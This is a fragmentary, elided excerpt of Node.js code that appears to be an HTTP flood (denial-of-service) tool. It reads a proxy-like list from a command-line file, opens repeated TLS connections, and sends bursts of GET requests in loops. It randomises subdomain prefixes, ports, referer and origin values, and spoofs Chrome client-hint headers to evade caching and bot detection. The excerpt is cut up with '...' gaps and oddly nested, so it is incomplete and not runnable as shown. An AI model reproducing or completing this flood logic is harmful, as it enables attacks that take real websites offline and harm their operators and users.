...
var mqfi9qjkf3i = fs.readFileSync(process.argv[6], 'utf8').replace(/\r/g, '').split('\n');
...
function h1_handler() {
    ...
    let generator = Math.floor(Math.random() * (65535 - 100 + 1)) + 100
    let request = `GET ${url.pathname}CURRENT=${ggg} HTTP/1.1\r\n` +
        `Host: ${generator}-${generator}.${url.hostname}\r\n` +
            ...
            SocketTLS = tls.connect({
                ...
                function main() {
                    ...
                    for (let i = 0; i < ratelimit; i++) {
                        const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                        const port = [`:23`, `:21`, `:8080`, `:8000`, `:4343`, `:3128`, ''][Math.floor(Math.random() * 6)];
                        const headers = Object.entries({
                            ...
                            "referer": `https://${randomString}.com/`,
                            "origin": `${randomString}.com/`,
                        }).filter(a => a[1] != null));
                ...
                SocketTLS = tls.connect({
                    ...
                    function main() {
                        ...
                        for (let i = 0; i < ratelimit; i++) {
                            ...
                            const headers = Object.entries({
                                ":method": "GET",
                                ":authority": `${generator}-${generator}.` + url.hostname,
                                ":scheme": "https",
                                ":path": url.pathname,
                            }).concat(Object.entries({
                                "sec-ch-ua": `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
